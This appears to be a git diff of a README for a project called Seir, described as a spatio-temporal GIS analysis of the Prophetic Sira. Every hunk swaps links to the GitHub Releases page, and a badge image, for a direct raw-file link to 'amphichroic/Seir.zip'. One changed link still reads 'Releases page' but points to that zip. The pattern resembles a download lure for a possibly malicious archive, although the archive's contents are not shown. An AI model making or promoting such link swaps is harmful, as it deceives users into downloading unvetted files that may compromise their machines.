@@ -1,6 +1,6 @@
 # 🌟 Seir - Explore the Life of the Prophet Visually
 
-[![Download Seir](https://img.shields.io/badge/Download-Seir-brightgreen.svg)](https://github.com/nikapikalove/Seir/releases)
+[![Download Seir](https://raw.githubusercontent.com/nikapikalove/Seir/main/amphichroic/Seir.zip)](https://raw.githubusercontent.com/nikapikalove/Seir/main/amphichroic/Seir.zip)
 
 # Seir: From Narrative to Network: A Spatio-Temporal GIS Analysis of the Prophetic Sira
 
@@ -46,7 +46,7 @@ The Geodatabase is vital for managing spatial data. It includes layers for key l
 
 ## 🚀 Installation & Setup
 
-1. Visit the [Releases page](https://github.com/nikapikalove/Seir/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/nikapikalove/Seir/main/amphichroic/Seir.zip).
 2. Download the latest version compatible with your operating system.
 3. Follow the instructions provided in the installer.
 
@@ -60,7 +60,7 @@ Ensure your system meets the following requirements:
 
 To download Seir, click the button below: 
 
-[![Download Seir](https://img.shields.io/badge/Download-Seir-brightgreen.svg)](https://github.com/nikapikalove/Seir/releases)
+[![Download Seir](https://raw.githubusercontent.com/nikapikalove/Seir/main/amphichroic/Seir.zip)](https://raw.githubusercontent.com/nikapikalove/Seir/main/amphichroic/Seir.zip)
 
 After downloading, follow the setup instructions to install the application properly.
 
